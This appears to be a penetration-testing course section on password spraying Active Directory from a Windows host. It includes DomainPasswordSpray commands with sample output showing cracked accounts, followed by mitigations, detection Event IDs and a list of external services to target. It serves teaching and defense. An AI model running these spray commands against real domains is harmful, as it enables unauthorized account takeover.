## Internal Password Spraying from Windows

From a domain-joined Windows host, [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) is the primary tool for this attack. When authenticated to the domain, it automatically pulls the user list from Active Directory, reads the password policy, and removes any accounts within one attempt of lockout before spraying begins.

***

## Using DomainPasswordSpray

Since the host is already domain-joined, you can skip supplying a manual user list and let the tool generate one automatically. Use `-Password` for a single password attempt and `-OutFile` to write hits to a file:

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

Example output:

```
[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain
[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1
[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success
```

The tool confirms the lockout threshold, strips out disabled accounts, removes at-risk accounts, and prompts for confirmation before running. [Kerbrute](https://github.com/ropnop/kerbrute) is also available at `C:\Tools` on the provided lab host if you want to replicate the Linux spray steps from a Windows context.

***

## Mitigations

No single control eliminates password spraying entirely. A layered defence approach is the most effective posture.

| Technique | Description |
|-----------|-------------|
| Multi-factor Authentication | Push notifications, OTP apps like Google Authenticator, RSA keys, or SMS confirmations all raise the bar. Note that some MFA implementations still reveal whether a username and password combination is valid, so all external portals must be covered |
| Restricting Access | Not every domain user should be able to log into every application. Apply least privilege and restrict application access to only those who need it for their role |
| Reducing Impact | Ensure privileged users have separate admin accounts for administrative tasks. Apply application-level permission tiers and use network segmentation to contain a compromised account to a limited blast radius |
| Password Hygiene | Train users to choose passphrases rather than simple passwords. Use a password filter to block common dictionary words, seasonal terms, month names, and variations of the company name |
| Lockout Policy Review | An overly strict lockout policy that requires manual admin intervention to unlock accounts can turn a careless spray into a denial-of-service event affecting large numbers of users |

***

## Detection

The following Windows Event IDs are the primary signals for detecting spray activity. Defenders should build correlation rules around volume thresholds rather than individual events.

- [Event ID 4625 (An account failed to log on)](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625): Generated on SMB-based sprays against Domain Controllers. Configure alerts for more than 50 occurrences within one minute
- [Event ID 4771 (Kerberos pre-authentication failed)](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771): Generated when an attacker targets LDAP instead of SMB to avoid 4625 events. Requires Kerberos logging to be enabled via Group Policy. Configure alerts for more than 50 occurrences with failure code `0x18` within one minute
- Event ID 4648 (A logon was attempted using explicit credentials): Generated on the workstation where the spray is executed. Configure alerts for more than 100 occurrences within one minute

A smarter attacker will avoid SMB entirely and spray over LDAP, which suppresses 4625 events entirely. Enabling Kerberos logging is therefore essential for complete coverage. The [Trimarc research post on detecting password spraying with Security Event Auditing](https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-password-spraying-with-security-event-auditing) covers these detection methods in detail and is worth reading in full.

Defenders can also run the following PowerShell command daily to surface accounts with suspicious `lastbadpasswordattempt` timestamps that cluster within seconds of each other, which is a reliable indicator of automated spraying:

```powershell
Get-ADUser -Filter * -Properties lastbadpasswordattempt,badpwdcount | Select-Object name,lastbadpasswordattempt,badpwdcount | Format-Table -Auto
```

***

## External Password Spraying

External spraying follows the same principles but targets internet-facing services. Common targets include:

- Microsoft 365 and Outlook Web Exchange
- Exchange Web Access and Skype for Business / Lync Server
- Microsoft Remote Desktop Services (RDS) portals
- Citrix portals using AD authentication
- VDI implementations such as VMware Horizon
- VPN portals using AD authentication (Citrix, SonicWall, OpenVPN, Fortinet)
- Custom web applications backed by AD authentication
